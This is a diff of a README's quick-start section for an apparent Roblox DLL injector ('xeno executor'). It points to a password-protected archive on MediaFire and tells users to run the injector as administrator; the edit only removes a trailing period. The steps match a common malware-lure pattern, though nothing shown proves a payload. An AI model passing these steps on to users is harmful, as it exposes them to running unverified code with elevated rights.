@@ -70,7 +70,7 @@ One DLL. One injector. No external console.
 ## Quick start
 
 1. Download the latest package from the
-   [download folder](https://www.mediafire.com/folder/7q4dz0de1v2y0/xeno+executor). Archive password: **5139237619**.
+   [download folder](https://www.mediafire.com/folder/7q4dz0de1v2y0/xeno+executor). Archive password: **5139237619**
 2. Launch Roblox and join a game.
 3. Run the injector as administrator:
 
